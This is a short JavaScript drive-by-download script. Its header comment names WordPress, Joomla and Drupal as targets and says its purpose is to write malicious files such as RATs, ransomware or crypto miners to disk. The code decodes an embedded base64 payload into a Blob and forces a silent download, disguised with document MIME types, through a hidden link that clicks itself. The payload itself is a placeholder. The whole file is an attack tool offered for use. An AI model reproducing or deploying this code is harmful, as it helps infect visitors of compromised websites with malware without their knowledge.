/**
 * @target: WordPress, Joomla, Drupal
 * @action: Write a malicious file to disk (e.g., RATs, Ransomware, Crytpo miner)
 * @context: Decode an embedded payload using HTML5's Blob object via web browser
 *
 * Original script by @demetriusford (https://github.com/demetriusford/drive-by-download)
 */

const MIMES = {
  '.doc': 'application/msword'
  , '.pdf': 'application/pdf'
  , '.exe': 'application/octet-stream'
, };

class MimeFactory {
  constructor(type) {
    if (!(type in MIMES)) return;
    
    this.type = MIMES[type];
  }
}

((file, payload) => {
  const empty = ({
    length
  }) => length === 0;

  if (empty(file) || empty(payload)) return;

  const decoded = window.atob(payload);

  const mime = new MimeFactory(file);
  const size = payload.length;
  const link = document.createElement('a');

  const bin = new Uint8Array(size);
  for (let i = 0; i < size; i++) {
    bin[i] = decoded.charCodeAt(i);
  }

  const blob = new Blob([bin.buffer]
    , {
      type: mime.type
    });

  const url = window.URL.createObjectURL(blob);

  link.style = 'display:none;';
  link.href = url;
  link.download = file;

  document.body.appendChild(link);
  link.click();

  window.URL.revokeObjectURL(url);
  document.body.removeChild(link);

})('filename.exe', 'base64_file');
